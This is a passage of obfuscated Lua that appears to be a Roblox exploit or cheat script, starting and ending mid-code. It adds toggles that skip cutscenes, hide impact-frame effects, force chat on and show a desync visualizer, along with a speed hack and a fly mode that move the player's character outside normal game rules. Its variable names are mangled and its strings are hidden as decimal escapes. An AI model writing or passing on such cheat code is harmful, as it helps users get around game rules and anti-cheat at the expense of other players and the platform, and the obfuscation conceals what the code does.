 _IIIlIllllI = newChild:GetPropertyChangedSignal("\067\097\109\101\114\097\084\121\112\101"):Connect( function () if newChild.CameraType ~= Enum.CameraType.Custom and _llIIllIlll.NoCameraAnimations.Value and not getgenv()._cpCamActive then task.spawn(fixCam) end
 end
 ) end
 end
 function fixCam() if not _IIIllIllIl(_llIlIIlIll) then repeat task.wait() until _IIIllIllIl(_llIlIIlIll) end
 local _IlllllIlII = _IIIllIllIl(_llIlIIlIll) local _IllIllIlll if _IlllllIlII then _IllIllIlll = getHumanoid(_IlllllIlII) else _IllIllIlll = _IlllllIlII end
 if _IlllllIlII and (_IllIllIlll and workspace.CurrentCamera) then local _IlIlllIIII = workspace.CurrentCamera.CFrame workspace.CurrentCamera:Destroy() local _llIIllllII = Instance.new("\067\097\109\101\114\097", workspace) _llIIllllII.CameraType = "\067\117\115\116\111\109" _llIIllllII.CameraSubject = _IllIllIlll _llIIllllII.CFrame = _IlIlllIIII _llIlIIlIll.CameraMode = "\067\108\097\115\115\105\099" _IlllllIlII:WaitForChild("\072\101\097\100", 0x1).Anchored = false end
 end
 _IIlIIIlIll:AddToggle("\078\111\067\097\109\101\114\097\065\110\105\109\097\116\105\111\110\115", { Text = "\078\111\032\067\117\116\115\099\101\110\101\115", Default = false, Callback = function (noCamAnimVal) if noCamAnimVal then local _IIIIlIllII = _llIlIIlIll.Character if _IIIIlIllII and _IIIIlIllII:FindFirstChild("\067\111\109\109\117\110\105\099\097\116\101") then pcall( function () _IIIIlIllII.Communicate:FireServer({ Goal = "\068\105\115\097\098\108\101\032\073\110\116\114\111" }) end
 ) end
 local _IllllIlIlI = workspace.CurrentCamera if _IllllIlIlI and _IllllIlIlI.CameraType ~= Enum.CameraType.Custom then task.spawn(fixCam) end
 end
 end
 , }) do local _IIIlIlIlII = nil local _lIIllIIllI = { FXUi = true, ImpactFrames = true, Flash = true, Flexworks = true, Impact = true, Impact2 = true, Impact3 = true, BatImpact = true, GuiAnim = true } local _lIIIIIIIll = { [0x3BC3F1AFB] = true, [0x3BC3F223F] = true, [0x3BC3F2B79] = true, [0x5FC35F7740E8] = true, [0x5E8F84879F0B] = true, [0x54DBF3809978] = true, [0x56220E50C5F3] = true, [0x770F239BB079] = true, [0x633A60BA49E3] = true, [0x72BC8EF5B153] = true, [0x6D913898D140] = true, [0x55B4CFCEE592] = true, [0x6881480FBD2B] = true, [0x582CF79F56F3] = true, [0x46DCD0648ADE] = true, [0x5144D04238B9] = true, [0x6921A0CB23EE] = true, [0x68BDB17A7D69] = true, [0x625048FE0E9A] = true, [0x5DA0D3DFC2A2] = true, [0x692C69587296] = true, [0x60C7317CD992] = true, [0x5E95D54BF4A2] = true, [0x5A01B50144AC] = true, [0x7DC4B666CE68] = true, [0x428D1E18EC6D] = true, [0x6AE4D46E0A15] = true, [0x6E534115F65B] = true, [0x43738E64E5B4] = true, [0x7D75A61C9FDA] = true, [0x569B8B91F323] = true, [0x41E14E640DE5] = true, [0x6CD1A93F9ED3] = true, [0x5D547FD7B831] = true, [0x649A718AD413] = true, [0x49C2125A0440] = true, [0x4F686431F2ED] = true, [0x5FE4E7F36AB7] = true, [0x7A8ED95E2BD1] = true, [0x4EA5DE474867] = true, [0x5906436C9A39] = true, [0x45BF131CF373] = true, [0x60A4E89C34D7] = true, [0x49FF676EB0B7] = true, [0x678561E65951] = true, [0x552A43424D4A] = true, [0x440DD079C97B] = true, [0x494711F634D5] = true, [0x76F4B826F867] = true, [0x5CFD7A238852] = true, [0x63F8DE24F444] = true, [0x6190B2029DBC] = true, [0x648DC1F688AB] = true, [0x52E222993837] = true, [0x4ACEABD36066] = true, [0x679A721E5806] = true, [0x4E974CD418A5] = true, [0x7676DF0A469F] = true, [0x75D0F4A20A15] = true, [0x56118B2BDD7C] = true, [0x5FEC83CD1924] = true, [0x71F1E7F4B692] = true, [0x5D85442CB6C7] = true, [0x5B757B97FF01] = true, [0x41C8848E5BFD] = true, [0x56302EC498A6] = true, [0x63CE3EC70DFE] = true, [0x55964C9C31C5] = true, [0x7B17882EC15A] = true, [0x69D6506B3F1C] = true, [0x7E2EDCB1A32F] = true, [0x61ADC0D56D1E] = true, [0x68F697F6E145] = true, [0x50100800C970] = true, [0x68044FD5FD9F] = true, [0x40ADC200C8EB] = true, [0x749B29607E2B] = true, [0x7B56B0E6CC8A] = true, [0x7C66496A614D] = true, [0x73AC72714191] = true, [0x49E977F18D91] = true, [0x6215BA0A48E3] = true, [0x78DA841DF5D6] = true, [0x69822295F48A] = true, [0x4F16F22015CD] = true, [0x7F98DE8C2AC7] = true, [0x59746210EAB5] = true, [0x42F1A99AF679] = true, [0x6F80E2396BF1] = true, [0x6AA1D19430FC] = true, [0x56DF84FEA88B] = true, [0x7E4859BB6B23] = true, [0x433E5854751B] = true, [0x5E4081D28A94] = true, [0x4ED41B680751] = true, [0x5C66176BFE2C] = true, [0x5BE218E88EDC] = true, [0x7ACD9B9B6B29] = true, [0x69B978DC2C6A] = true, [0x5F1637633798] = true, [0x7153208A8DB8] = true, [0x5675B4230B03] = true, [0x68D7AC06ED7E] = true, [0x6BE954D45BAA] = true, [0x43C0826ECABE] = true, [0x5A655A427CA3] = true, [0x76E90474B282] = true, [0x71166A586838] = true, [0x69A55FAA1053] = true, [0x6C4503A41A42] = true, [0x4DA1D3904B87] = true, [0x7A2244560959] = true, [0x4955E787945B] = true, [0x5F0C0F34E9E8] = true, [0x7FCC921B5ACD] = true, [0x4C3782D3A3CA] = true, [0x6C25982D2345] = true, [0x46DA5BFDD007] = true, [0x5731C58D2D88] = true, [0x7CFF9FCDC972] = true, [0x4C3602AB98FF] = true, [0x526A7A9B88EF] = true, [0x59030EE573F6] = true, [0x71C105FB0921] = true, [0x46AF7765201A] = true, [0x7AE676D1D7AC] = true, [0x793A42E4E08B] = true, [0x6F9A486AB209] = true, [0x53C03C13C7BD] = true, [0x64E1938970F5] = true, [0x6A4A88B11565] = true, [0x55677E4D1FAC] = true, [0x4DC27FB6133E] = true, [0x71A87077CC1B] = true, [0x7E6C7EA97407] = true, [0x5BD50A374985] = true, [0x72A9CCDFF0A7] = true, [0x5FBAF6496EDA] = true, [0x540CD07C5849] = true, [0x7D6C5866D19A] = true, [0x48F7FD5D2B6B] = true, [0x59BA3DAEF526] = true, [0x72BB06778100] = true, [0x5473254D4570] = true, [0x7ED3E15A8765] = true, [0x426A0D7B7F67] = true, [0x79B96E585B8C] = true, [0x52C9313381B9] = true, [0x7C37BD4BF29A] = true, [0x73AC49F77AB1] = true, [0x5A4702620882] = true, [0x79E28ED1D5AE] = true, [0x422932D7AC97] = true, [0x11C02CD40] = true, [0x11C02CA52] = true, [0x379F12621] = true, [0x37A0209EF] = true, [0x379FA2FCB] = true, [0x61207F5B9BF7] = true, [0x503AC6D3E73D] = true, [0x5CE1BBA75F22] = true, [0x6FC28E1F17FA] = true, [0x77CFA2B54D68] = true, [0x4E7E9A85E2A0] = true, [0x5FC0DD03D936] = true, [0x5EB3A2A12D65] = true, [0x596FD823CFB0] = true, [0x6765F3F3EC4D] = true, [0x73896027EAFC] = true, [0x5AB94DA4C804] = true, [0x7B824DE9E7EC] = true, [0x75DDE77D0CDB] = true, [0x7326A2C28404] = true, [0x6A4723820DEC] = true, [0x633211BBE48F] = true, [0x3BC3A2C72] = true, [0x3BC3A2B22] = true, [0x3BC3A37A7] = true, [0x3BC3A39EB] = true, [0x3BC3A2D40] = true, [0x3BC3A2ED6] = true, [0x3BC3A2FD5] = true, [0x3BC3A30BA] = true, [0x3BC3A320B] = true, [0x3BC3A3346] = true, [0x3BC3A34C5] = true, [0x3BC3A35C4] = true, [0x3BCF48110] = true, [0x3BCF48CF6] = true, [0x3BCF4A4B3] = true, [0x3BD0DD702] = true, [0x3BD0F0A31] = true, [0x405BC32B5] = true, [0x405BC33C0] = true, [0x405BC31B6] = true, [0x44C6A04A1] = true, [0x40A8BD750] = true, [0x40A02919C] = true, [0x374EA010B] = true, [0x409F5C270] = true, [0x40A00A76E] = true, [0x40A00B20C] = true, [0x40A00BEE4] = true, [0x40A00AD96] = true, [0x40A01067B] = true, [0x40A01059B] = true, [0x40A010447] = true, [0x40A010334] = true, [0x40A010252] = true, [0x40A010149] = true, [0x40A010086] = true, [0x40A00FFB6] = true, [0x40A00FE62] = true, [0x40A00FD19] = true, [0x40A00FBE5] = true, [0x40A00FAEB] = true, [0x40A00F9A3] = true, [0x40A00F833] = true, [0x40A00F6C4] = true, [0x40A00F505] = true, [0x40A00F3C1] = true, [0x40A00F248] = true, [0x40A00F0DF] = true, [0x40A00EFC8] = true, [0x40A00EEA1] = true, [0x40A00ED68] = true, [0x40A00EAC5] = true, [0x40A00E990] = true, [0x40A00E838] = true, [0x40A00E682] = true, [0x40A00E543] = true, [0x40A00E44C] = true, [0x40A00E305] = true, [0x40A00E1C9] = true, [0x40A00DFBC] = true, [0x40A00DDC8] = true, [0x40A00DCBE] = true, [0x40A00DBEE] = true, [0x3FAEB0EE4] = true, [0x3FAEB05B8] = true, [0x3FAEB07EB] = true, [0x3FAEB09D6] = true, [0x3FAEB0B44] = true, [0x3FAEB0D31] = true, [0x3FAEB0DB4] = true, [0x3FAEB0493] = true, [0x44D0DA860] = true, [0x44D0DA43E] = true, [0x44D0DA1E9] = true, [0x44D0D9FE2] = true, [0x44D0D9E46] = true, [0x44D0D9CCD] = true, [0x44D0D9AF2] = true, [0x44D0D9899] = true, [0x44D0D9699] = true, [0x44D0D9483] = true, [0x44D0DB611] = true, [0x44D0D92D9] = true, [0x44D0D90EF] = true, [0x44D0D8F34] = true, [0x44D0D8D30] = true, [0x44D0E60B8] = true, [0x44D0D89AD] = true, [0x44D0DB46C] = true, [0x44D0DB2D3] = true, [0x44D0DB12F] = true, [0x44D0DAF47] = true, [0x44D0DAD3A] = true, [0x44D0DAB7D] = true, [0x44D0DAA42] = true, [0x44D0DB7A7] = true, [0x13412B939] = true, [0x410F36FE1] = true, [0x44CCB5D32] = true, [0x44B3D71B8] = true, [0x3F362A95C] = true, [0x781754968156] = true, [0x5078D7CC4D7C] = true, [0x5AC6AA80104E] = true, [0x6EC1AF5C6741] = true, [0x794B088815E1] = true, [0x6D728BBC72F6] = true, [0x429C6DA0D355] = true, [0x6FDD888439DB] = true, [0x79F3F28C53E4] = true, [0x5F0F979BB7CF] = true, [0x785EC7F6AF4F] = true, [0x6A8F7697657D] = true, [0x6CCD0C158DAF] = true, [0x491A99E21D8D] = true, [0x7E01B8A8219C] = true, [0x476F432D2EA4] = true, [0x4CE8592D0ED1] = true, [0x6E25F2ACEE9F] = true, [0x73E5BD79EE5A] = true, [0x7B55921D3AA2] = true, [0x4649E1F5B3C4] = true, [0x51EAB26A1C73] = true, [0x7222D9F01B97] = true, [0x79A8B8729725] = true, [0x56E249A7D9A8] = true, [0x5A63529ED4BE] = true, [0x4EEDDC4A2DCD] = true, [0x4EC0ABA01BF0] = true, [0x5D76F90D5619] = true, [0x797D78F1B689] = true, [0x5A107BC1F1AF] = true, [0x63D6BDB9E05A] = true, [0x7B294F40298A] = true, [0x7215E3AE58B8] = true, [0x7A50394198ED] = true, [0x6D6283E9C959] = true, [0x6EC4D667AD2F] = true, [0x4AF450E0AD1B] = true, [0x4C9023B29FC0] = true, [0x4AAC515F407C] = true, [0x4F85607EAC18] = true, [0x522D90BDC718] = true, [0x5D118E4976EE] = true, [0x5E3780C08E39] = true, [0x6D4559F7B570] = true, [0x4C6AA0015A71] = true, [0x485E3EE39392] = true, [0x5ABD54E12241] = true, [0x6BD4E14152EE] = true, [0x7080C54528D4] = true, [0x6F320869EB69] = true, [0x624F2EA82027] = true, [0x7E2E7503CA56] = true, [0x48698672C52D] = true, [0x53D225B653E5] = true, [0x7778319C0C15] = true, [0x6A882E4B9CA3] = true, [0x5FA6136672D3] = true, [0x68606A71162B] = true, [0x7D6624921802] = true, [0x49CDC0747278] = true, [0x56E41778F296] = true, [0x7F9BEDC4303F] = true, [0x7EF9FD916BB5] = true, [0x6FD4ECA6B716] = true, [0x4DF2E91A35FE] = true, [0x718BFF76F687] = true, [0x528EBE742889] = true, [0x50E0ED0FB885] = true, [0x72A174B71370] = true, [0x435A425C65B3] = true, [0x5AD55C0C561D] = true, [0x62D4FEDB5CA5] = true, [0x62BC95037749] = true, [0x42C454F37B2A] = true, [0x56D0A332A8E5] = true, [0x66639084D145] = true, [0x595B0E987A14] = true, [0x5A37B63C14B0] = true, [0x6C642ADBEAD1] = true, [0x5775ECE61A24] = true, [0x43BB3B405755] = true, [0x50008322F0B3] = true, [0x65BCECBB73CA] = true, [0x6135EC25F97D] = true, [0x4B39E4B4484F] = true, [0x6644329878C9] = true, [0x4E5D7940247D] = true, [0x783EB2F49857] = true, [0x600011B27E3F] = true, [0x6D4CB904CC9B] = true, [0x6BA39BFBD97C] = true, [0x5754B3088FCE] = true, [0x6CE931C8713D] = true, [0x573F6ABE9A6F] = true, [0x64EFC24188E8] = true, [0x4BF3356A941E] = true, [0x50F3EA48F507] = true, [0x7409DB7CAC6C] = true, [0x764F0C5DBD73] = true, [0x4545C43E27A2] = true, [0x43F5D67DD1C5] = true, [0x5A9932BC10FB] = true, [0x425433F6C7DE] = true, [0x6A33B062A015] = true, [0x483BC959A594] = true, [0x54B2F0149C75] = true, [0x54AACB1E3F49] = true, [0x5742DD42842F] = true, [0x7324383834A5] = true, [0x6EAC95088EAF] = true, [0x5D6AE6380730] = true, [0x442693A60966] = true, [0x7BA0447C51FC] = true, [0x615917191BA9] = true, [0x672AE8758E1D] = true, [0x70957CEC9353] = true, [0x761FF41BFC6A] = true, [0x7F7C67EA1A8F] = true, [0x5E607AB760EA] = true, [0x673F8B866644] = true, [0x672308B48A42] = true, [0x4A5F2186F3B8] = true, [0x52E5F21255E6] = true, [0x7BD40CF5AFBD] = true, [0x72B9628C9C6A] = true, [0x43EBDBC06550] = true, [0x76D27E8E4EDB] = true, [0x79DFB2B1F31B] = true, [0x5E9599052AB6] = true, [0x5BA4E09BDDC7] = true, [0x4A1E4C323290] = true, [0x28B272078] = true, [0x3D87833AB] = true, [0x3D879217F] = true, [0x3D87846FB] = true, [0x3D8785596] = true, [0x3D87863FE] = true, } local _IIIllIIllI = nil local function _IlllIIllII(elem) local _IlIIIllllI = tonumber((elem.Image or ""):match("\037\100\043")) if _IlIIIllllI and _lIIIIIIIll[_IlIIIllllI] then pcall( function () elem.ImageTransparency = 0x1 end
 ) pcall( function () elem.BackgroundTransparency = 0x1 end
 ) end
 end
 local function _lIlIIIIIIl(sg) if _lIIllIIllI[sg.Name] then sg.Enabled = false return end
 end
 _IIlIIIlIll:AddToggle("\078\111\073\109\112\097\099\116\070\114\097\109\101\115", { Text = "\078\111\032\073\109\112\097\099\116\032\070\114\097\109\101\115", Default = false, }):OnChanged( function () local _lIlllllIll = _llIlIIlIll:FindFirstChild("\080\108\097\121\101\114\071\117\105") if _llIIllIlll.NoImpactFrames.Value then local _llIlIllllI = _lIlllllIll and _lIlllllIll:FindFirstChild("\077\111\098\105\108\101\074\117\110\107") if _llIlIllllI then _llIlIllllI.Enabled = false end
 if _lIlllllIll then for _lIIlIllIlI, sg in ipairs(_lIlllllIll:GetChildren()) do if sg:IsA("\083\099\114\101\101\110\071\117\105") then pcall(_lIlIIIIIIl, sg) end
 end
 _IIIlIlIlII = _lIlllllIll.ChildAdded:Connect( function (_IIIlIIIlII) if not _IIIlIIIlII:IsA("\083\099\114\101\101\110\071\117\105") then return end
 if _lIIllIIllI[_IIIlIIIlII.Name] then _IIIlIIIlII.Enabled = false end
 end
 ) _IIIllIIllI = _lIlllllIll.DescendantAdded:Connect( function (elem) if not (elem:IsA("\073\109\097\103\101\076\097\098\101\108") or elem:IsA("\073\109\097\103\101\066\117\116\116\111\110")) then return end
 pcall(_IlllIIllII, elem) end
 ) end
 else if _IIIlIlIlII then _IIIlIlIlII:Disconnect() _IIIlIlIlII = nil end
 if _IIIllIIllI then _IIIllIIllI:Disconnect() _IIIllIIllI = nil end
 local _llIlIllllI = _lIlllllIll and _lIlllllIll:FindFirstChild("\077\111\098\105\108\101\074\117\110\107") if _llIlIllllI then _llIlIllllI.Enabled = true end
 if _lIlllllIll then for _lIIIIllIIl in pairs(_lIIllIIllI) do local _IIlIIlIIII = _lIlllllIll:FindFirstChild(_lIIIIllIIl) if _IIlIIlIIII then _IIlIIlIIII.Enabled = true end
 end
 end
 end
 end
 ) table.insert(_IllIllIIll, function () if _IIIlIlIlII then _IIIlIlIlII:Disconnect() _IIIlIlIlII = nil end
 if _IIIllIIllI then _IIIllIIllI:Disconnect() _IIIllIIllI = nil end
 pcall( function () _llIIllIlll.NoImpactFrames:SetValue(false) end
 ) end
 ) end
 _IIlIIIlIll:AddToggle("\065\108\119\097\121\115\067\097\110\067\104\097\116", { Text = "\065\108\119\097\121\115\032\067\097\110\032\067\104\097\116", Default = false, }) do local _llIlllIIlI = game:GetService("\083\116\097\114\116\101\114\071\117\105") _llIlllIIlI.CoreGuiChangedSignal:Connect( function (param, enabled) if enabled then return end
 if not _llIIllIlll.AlwaysCanChat.Value then return end
 if param == Enum.CoreGuiType.Chat or param == Enum.CoreGuiType.All then RunService.RenderStepped:Wait() _llIlllIIlI:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true) end
 end
 ) end
 _IIlIIIlIll:AddDivider() _IIlIIIlIll:AddToggle("\086\105\115\117\097\108\105\122\101\114", { Text = "\068\101\115\121\110\099\032\086\105\115\117\097\108\105\122\101\114", Default = false, }) _IIlIIIlIll:AddToggle("\065\108\119\097\121\115\086\105\115\117\097\108\105\122\101", { Text = "\065\108\119\097\121\115\032\069\110\097\098\108\101\100", Default = false, }) task.spawn( function () if workspace.CurrentCamera then patchCamera(workspace.CurrentCamera) end
 workspace.ChildAdded:Connect( function (_IIIlIIIlII) task.defer(patchCamera, _IIIlIIIlII) end
 ) end
 ) table.insert(_IllIllIIll, function () if _IIIlIllllI then _IIIlIllllI:Disconnect() _IIIlIllllI = nil end
 if _fovRenderConn then _fovRenderConn:Disconnect() _fovRenderConn = nil end
 pcall( function () _llIIllIlll.NoCameraAnimations:SetValue(false) end
 ) pcall( function () _llIIllIlll.FOVEnabled:SetValue(false) end
 ) pcall( function () _llIIllIlll.Visualizer:SetValue(false) end
 ) pcall( function () _llIIllIlll.AlwaysVisualize:SetValue(false) end
 ) end
 ) do RevenantWhitelist = RevenantWhitelist or {} end
 end
 do local _IIlIIIIIll = { Forward = "\049\055\049\050\052\048\054\051\056\050\054", Back = "\049\055\049\050\052\048\054\055\054\051\053", Left = "\049\055\049\050\052\049\048\053\050\057\052", Right = "\049\055\049\050\052\049\049\050\053\052\055", _IIllllIlIl = "\049\055\049\050\052\048\054\049\054\054\051", } local _IlIIIlIlII = 0.1 local _llIlIlIIII = {} local function _llIlIIIllI() for _lIIlIllIlI, _lIIIllllII in pairs(_llIlIlIIII) do pcall( function () if _lIIIllllII.IsPlaying then _lIIIllllII:Stop(0x0) end
 end
 ) pcall( function () _lIIIllllII:Destroy() end
 ) end
 _llIlIlIIII = {} end
 local function _lIIIIlIlll(_lIlIlllIIl) for _lIIIIllIIl, _IlIlIlIlIl in pairs(_llIlIlIIII) do local _lIlIlIlIIl = false for _lIIlIllIlI, _IllIIlllIl in ipairs(_lIlIlllIIl) do if _IllIIlllIl == _lIIIIllIIl then _lIlIlIlIIl = true break end
 end
 if _lIlIlIlIIl then if not _IlIlIlIlIl.IsPlaying then pcall( function () _IlIlIlIlIl:Play(_IlIIIlIlII) end
 ) end
 else if _IlIlIlIlIl.IsPlaying then pcall( function () _IlIlIlIlIl:Stop(_IlIIIlIlII) end
 ) end
 end
 end
 end
 _IIlIllllIl:AddToggle("\083\112\101\101\100\072\097\099\107\069\110\097\098\108\101\100", { Text = "\067\070\114\097\109\101\032\083\112\101\101\100", Default = false, }) _IIlIllllIl:AddSlider("\083\112\101\101\100\072\097\099\107", { Text = "\083\112\101\101\100", Default = 0x1, Min = 0x1, Max = 0x61A8, Rounding = 0x1, Compact = true, }) _IIlIllllIl:AddDropdown("\083\112\101\101\100\072\097\099\107\077\101\116\104\111\100", { Text = "\077\101\116\104\111\100", Values = { "\067\070\114\097\109\101", "\086\101\108\111\099\105\116\121" }, Default = 0x1, Multi = false, }) _IIlIllllIl:AddToggle("\085\112\115\105\100\101\068\111\119\110", { Text = "\085\112\115\105\100\101\032\068\111\119\110", Default = false, Callback = function (_IIlIlIIlII) _lIIIllIlIl["\085\112\115\105\100\101\032\068\111\119\110"] = _IIlIlIIlII end
 , }) task.spawn( function () while RunService.PreSimulation:Wait() do local _IIllllIIIl = _lIIlIllIlI.SpeedHackMethod.Value local _IIllIIlllI = _llIlIIlIll.Character local _lIlIllIlIl = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIllIIlllI and _lIlIllIlIl and _lIlIIllIII and _llIIllIlll.SpeedHackEnabled.Value and not _lIIIllIlIl.Flying then if _IIllllIIIl == "\067\070\114\097\109\101" then _lIlIllIlIl.CFrame = _lIlIllIlIl.CFrame + _lIlIIllIII.MoveDirection * (_lIIlIllIlI.SpeedHack.Value / 0x2710) elseif _IIllllIIIl == "\086\101\108\111\099\105\116\121" and _lIlIIllIII.MoveDirection ~= Vector3.new() then repeat local _lIllllllII = _lIlIIllIII.MoveDirection.Unit * (_lIIlIllIlI.SpeedHack.Value / 0x64) _lIlIllIlIl.Velocity = Vector3.new(_lIllllllII.X, _lIlIllIlIl.Velocity.Y, _lIllllllII.Z) RunService.PreSimulation:Wait() until _lIlIIllIII.MoveDirection == Vector3.new() or _lIIlIllIlI.SpeedHackMethod.Value ~= _IIllllIIIl _lIlIllIlIl.Velocity = Vector3.new() end
 end
 end
 end
 ) table.insert(_IllIllIIll, function () pcall( function () _llIIllIlll.UpsideDown:SetValue(false) end
 ) pcall( function () _llIIllIlll.SpeedHackEnabled:SetValue(false) end
 ) end
 ) _llllIIlllI:AddToggle("\082\101\118\101\110\097\110\116\070\108\121", { Text = "\070\108\121", Default = false, Callback = function (flyToggleVal) if not flyToggleVal then if _lIIlIllIlI.RevenantFlyBind then _lIIlIllIlI.RevenantFlyBind.Toggled = false end
 _lIIIllIlIl.Flying = false end
 end
 , }):AddKeyPicker("\082\101\118\101\110\097\110\116\070\108\121\066\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\089", Text = "\070\108\121", Callback = function (flySpeedVal) if _IllllIlIII.Fly then return end
 if flySpeedVal and not _llIIllIlll.RevenantFly.Value then RunService.RenderStepped:Wait() _IllllIlIII.Fly = true _lIIlIllIlI.RevenantFlyBind.Toggled = false _lIIlIllIlI.RevenantFlyBind:DoClick() _IllllIlIII.Fly = false return end
 if not _llIIllIlll.RevenantFly.Value then return end
 _lIIIllIlIl.Flying = not _lIIIllIlIl.Flying _IIIllIIlll:Notify({ Title = _IlIIIlllII("\070\108\121"), Content = _lIIIllIlIl.Flying and "\084\111\103\103\108\101\100\032\111\110\032\9989" or "\084\111\103\103\108\101\100\032\111\102\102\032\10060", _IlllIlIllI = 0x2 }) if not _lIIIllIlIl.Flying then end
 local _lIIIlIIllI = nil local _IlIlIIIIlI = _IIIllIllIl(_llIlIIlIll) local _lIIIIIllIl if _IlIlIIIIlI then _lIIIIIllIl = getHumanoid(_IlIlIIIIlI) else _lIIIIIllIl = _IlIlIIIIlI end
 local _lIIllIIIll if _IlIlIIIIlI then _lIIllIIIll = getRoot(_IlIlIIIIlI) else _lIIllIIIll = _IlIlIIIIlI end
 if _IlIlIIIIlI and (_lIIllIIIll and _lIIIIIllIl) then _lIIIlIIllI = _lIIllIIIll.CFrame end
 if _lIIIIIllIl then for _lIIlIllIlI, _lIIIllllII in pairs(_lIIIIIllIl:GetPlayingAnimationTracks()) do local _IllIIIIllI = _lIIIllllII.Animation and _lIIIllllII.Animation.AnimationId:match("\037\100\043") or '' if _IllIIIIllI == "\055\056\049\053\054\049\056\049\055\053" or _IllIIIIllI == "\053\048\055\055\055\055\056\050\054" or _IllIIIIllI == "\053\048\055\055\055\054\048\052\051" or _IllIIIIllI == "\054\049\054\049\054\051\054\056\050" then pcall( function () _lIIIllllII:Stop(0x0) end
 ) end
 end
 end
 if _lIIIIIIllI[_llIIlIIIlI] then local _IlIlIllIll = _IlIlIIIIlI local _IllIllIIll = _IlIlIllIll and _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _lllllIIlII = _IllIllIIll and _IllIllIIll:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _IlIlIllIll and _lllllIIlII then _llIlIIIllI() for _lIIIIllIIl, _IlIIIllllI in pairs(_IIlIIIIIll) do local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IlIIIllllI local _lIIIllllII = _lllllIIlII:LoadAnimation(_IlIllllIlI) _lIIIllllII.Priority = Enum.AnimationPriority.Action _lIIIllllII.Looped = true _llIlIlIIII[_lIIIIllIIl] = _lIIIllllII end
 end
 end
 local _IlIllIlIll = RunService.Heartbeat:Connect( function (flyDelta) local _IIIIlIIlIl = _IIIllIllIl(_llIlIIlIll) local _lllIIlIlIl if _IIIIlIIlIl then _lllIIlIlIl = getHumanoid(_IIIIlIIlIl) else _lllIIlIlIl = _IIIIlIIlIl end
 local _lIIIIIlIll if _IIIIlIIlIl then _lIIIIIlIll = getRoot(_IIIIlIIlIl) else _lIIIIIlIll = _IIIIlIIlIl end
 local _IIIIIllIlI = workspace.CurrentCamera if _IIIIlIIlIl and (_lIIIIIlIll and (_lllIIlIlIl and _IIIIIllIlI)) then local _IllllIlIIl = _lIIlIllIlI.RevenantFlySpeed.Value / 0x64 local _IIlIlIIlII = Vector3.new(0x0, 0x0, 0x0) CFrame.new(0x0, 0x0, 0x0) local _IllIIIlIII = _IIIIIllIlI.CFrame local _IIIlIIlIII = _IllIIIlIII.LookVector local _lIlIllIllI = _IllIIIlIII.RightVector local _IIIIlIIIII = CFrame.new(_lIIIIIlIll.Position, _lIIIIIlIll.Position + Vector3.new(_IIIlIIlIII.X, 0x0, _IIIlIIlIII.Z)) local _llIlIlIlIl = math.round((_lllIIlIlIl.MoveDirection:Dot(_IIIIlIIIII.LookVector))) local _IlllIIllII = math.round((_lllIIlIlIl.MoveDirection:Dot(_IIIIlIIIII.RightVector))) if _llIlIlIlIl == 0x1 then _IIlIlIIlII = _IIlIlIIlII + _IIIlIIlIII * _IllllIlIIl local _lIIlIllIlI = _lIIIIIlIll.CFrame + _IIIlIIlIII * (flyDelta * _IllllIlIIl) end
 if _llIlIlIlIl == -0x1 then _IIlIlIIlII = _IIlIlIIlII + _IIIlIIlIII * -_IllllIlIIl local _lIIlIllIlI = _lIIIIIlIll.CFrame + -_IIIlIIlIII * (flyDelta * _IllllIlIIl) end
 if _IlllIIllII == -0x1 then _IIlIlIIlII = _IIlIlIIlII + _lIlIllIllI * -_IllllIlIIl local _lIIlIllIlI = _lIIIIIlIll.CFrame + -_lIlIllIllI * (flyDelta * _IllllIlIIl) end
 if _IlllIIllII == 0x1 then _IIlIlIIlII = _IIlIlIIlII + _lIlIllIllI * _IllllIlIIl local _lIIlIllIlI = _lIIIIIlIll.CFrame + _lIlIllIllI * (flyDelta * _IllllIlIIl) end
 if _llIlIlIlIl == 0x0 and _IlllIIllII == 0x0 then _lIIIIIlIll.Velocity = Vector3.new() _lIIIIIlIll.CFrame = _lIIIlIIllI or _lIIIIIlIll.CFrame else _lIIIIIlIll.Velocity = _IIlIlIIlII _lIIIlIIllI = _lIIIIIlIll.CFrame end
 _lIIIIIlIll.RotVelocity = Vector3.new() _lIIIIIlIll.CFrame = CFrame.new(_lIIIIIlIll.CFrame.Position, _lIIIIIlIll.CFrame.Position + _IllIIIlIII.LookVector) if _lIIIIIIllI[_llIIlIIIlI] then local _llIIlIlIll = {} if _llIlIlIlIl == 0x1 then table.insert(_llIIlIlIll, "\070\111\114\119\097\114\100") elseif _llIlIlIlIl == -0x1 then table.insert(_llIIlIlIll, "\066\097\099\107") end
 if _IlllIIllII == 0x1 then table.insert(_llIIlIlIll, "\082\105\103\104\116") elseif _IlllIIllII == -0x1 then table.insert(_llIIlIlIll, "\076\101\102\116") end
 if #_llIIlIlIll == 0x0 then _llIIlIlIll = { "\073\100\108\101" } end
 _lIIIIlIlll(_llIIlIlIll) end
 end
 end
 ) repeat task.wait() until not _lIIIllIlIl.Flying _lIIIllIlIl.Flying = false _IlIllIlIll:Disconnect() _llIlIIIllI() local _IlllIlIIII = _IIIllIllIl(_llIlIIlIll) local _lllIIIIllI if _IlllIlIIII then _lllIIIIllI = getRoot(_IlllIlIIII) else _lllIIIIllI = _IlllIlIIII end
 local _lIIllIIlll if _IlllIlIIII then _lIIllIIlll = getHumanoid(_IlllIlIIII) else _lIIllIIlll = _IlllIlIIII end
 if _lIIllIIlll then _lIIllIIlll.AutoRotate = true end
 if _IlllIlIIII and (_lllIIIIllI and (_lIIllIIlll and not _lIIllIIlll.SeatPart)) then local _IlIIIIIIIl = tick() _lllIIIIllI.Velocity = Vector3.new() if _lllIIIIllI.Velocity.Magnitude <= 0x5 or tick() >= _IlIIIIIIIl + 0x1 then end
 end
 if not (_lIIllIIlll and _lIIllIIlll.SeatPart) then end
 local _lIIlIlllll = tick() while true do if _lIIllIIlll and _lIIllIIlll.SeatPart then _lIIllIIlll.SeatPart.Velocity = Vector3.new() end
